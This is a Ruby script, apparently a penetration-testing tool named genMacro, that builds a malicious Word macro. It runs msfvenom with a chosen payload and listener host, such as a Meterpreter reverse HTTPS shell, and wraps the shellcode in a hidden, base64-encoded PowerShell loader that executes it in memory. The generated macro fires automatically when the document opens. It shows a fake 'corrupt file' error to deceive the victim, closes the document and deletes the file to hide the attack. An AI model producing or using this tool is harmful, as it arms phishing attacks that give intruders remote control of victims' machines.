#!/usr/bin/env ruby
#Andrew 'ch33kyf3ll0w' Bonstrom
#genMacro v1.0
#Generates an MS Word Macro that shellz, closes the Active Doc, finds the file, then deletes.
require 'open3'
require 'base64'
def usage
	puts "Usage: ruby genMacro.rb <Msf/Venom/Payload> <lHost> <lPort> <fileName>\n\n"
	puts "Example:ruby genMacro.rb windows/meterpreter/reverse_https 127.0.0.1 4444 MacroBrah\n"
end
#######################################################################################################################
#Macro Begins
#######################################################################################################################
#This second will create a fully copy/pasta word macro
def gen_Macro (content, removalCommand)
#Adds initial double quotes
	content = '"' + content
#Split every 200 chars and then rejoin with newline and string continuation in order to meet the string var limitation
	content = content.scan(/.{1,255}/).join("\" & _\r\n\"")
	content += '"'
#Splits the shellcode at the 4500 char point because thats roughly 24-25 lines for the first var
	first, second = content.slice!(0...4500), content
#Formats the output for the VBA macro
#Due to VBA restrictions for the number lines used during string concatenation of 24 lines we split
#the shell amongst two different variables and then concatenate the contents in a third variable
puts "Option Explicit"
	puts "Sub GetShellcode()"
	puts    "\t" + "On Error Resume Next"
	puts    "\t" + "Dim wsh As Object\n"
	puts    "\t" + 'Set wsh = CreateObject("WScript.Shell")'
	puts    "\t" + "Dim f1 As String\n"
	puts    "\t" + "Dim f2 As String\n"
	puts    "\t" + "Dim f3 As String\n"
	puts    "\t" + "f1 = " + first + '"'
	puts    "\n"
	puts    "\t" + "f2 = " + '"' + second
	puts    "\t" + "f3 = f1 & f2\n"
	puts    "\t" + "wsh.Run f3, 0"
	puts    "\t" + "On Error GoTo 0"
   	puts	 "Dim removal As String"
   	puts	 "removal = \"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + removalCommand + "\""
   	puts	 "Dim title As String"
   	puts	 'title = "Critical Microsoft Office Error"'
   	puts	 "Dim msg As String"
   	puts	 "Dim intResponse As Integer"
   	puts	 'msg = "This document appears to contain corrupt content. Please restore this file from a backup."'
   	puts	 "intResponse = MsgBox(msg, 16, title)"
	puts     "wsh.Run removal, 0"
   	puts	 "ActiveDocument.Close(wdDoNotSaveChanges)"
	puts "End Sub"
	puts "Sub AutoOpen()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
	puts "Sub Workbook_Open()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
end
#######################################################################################################################
#Prep Work Begins
#######################################################################################################################
#Formats Msfvenom output to byte code array
def format_shellcode(content)
	#Formats shellcode by replacing \ with ,0
	content = content.gsub!('\\', ",0")
	#Deletes instances of double quote
	content = content.delete ('"')
	#Deletes instances of semi colon
	content = content.delete (";")
	#Slices all content up until the first piece of byte code
	content = content.slice(content.index(",0x")..-1)
	#Strips out newline chars to create a single line	
	content = content.gsub("\n","")
	#Strips the first comma off
	content = content[1..-1]
	return content
end
#Creates msfvenom command based on user input so far
def generate_shellcode (payload, lhost, lport)
	newVar = ''
	formattedShellcode = ''
	#Build the msfvenom command from user input
	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " -a x86 --platform windows -f c")
	puts "Now running " +  command
	puts " "
	#Executes the built msfvenom command and assigns output to variable newVar
	Open3.popen3(command) {|stdin, stdout, stderr|
        newVar = stdout.read
	}
	#Msfvenom output is sent to format function
	formattedShellcode = format_shellcode(newVar)
	
	return formattedShellcode
end
def gen_command(shellcode)
	str = <<-EOS
	$v = '$R = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$J = Add-Type -memberDefinition $R -Name "Win32" -namespace Win32Functions -passthru;[Byte[]] $x = shellcodehere;$C = $J::VirtualAlloc(0,[Math]::Max($x.Length,0x1000),0x3000,0x40);for ($A=0;$A -le ($x.Length-1);$A++){$J::memset([IntPtr]($C.ToInt32()+$A), $x[$A], 1) | Out-Null};$J::CreateThread(0,0,$C,0,0,0);for(;;){Start-sleep 60};';$n = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($v));$arch = $ENV:Processor_Architecture;if($arch -ne'x86'){$cmd = "%systemroot%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -windowstyle hidden -enc ";iex $cmd $n}else{iex "$v"};
EOS
	mainStr = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + Base64.strict_encode64(str.to_s.sub("shellcodehere", shellcode).encode("utf-16le"))
	return mainStr
end
def genRemovalCommand(fileName)
	fullCommand = "Start-Sleep -s 1;Get-ChildItem C:" +fileName + ".doc -recurse | Remove-Item"
	return Base64.strict_encode64(fullCommand.to_s.encode("utf-16le"))

end
#######################################################################################################################
#Main
#######################################################################################################################
if ARGV.empty?
	usage
else
	genShellcode = generate_shellcode(ARGV[0],ARGV[1], ARGV[2])
	#Call function to base64 encode everything and issue out powershell command
	command = gen_command(genShellcode)
	fileName = ARGV[3]
	removalCommand = genRemovalCommand(fileName)
	#Case switch statement for different payload flags
	puts "Now creating Copy/Pastable Word Macro....\n\n"
	gen_Macro(command,removalCommand)
end
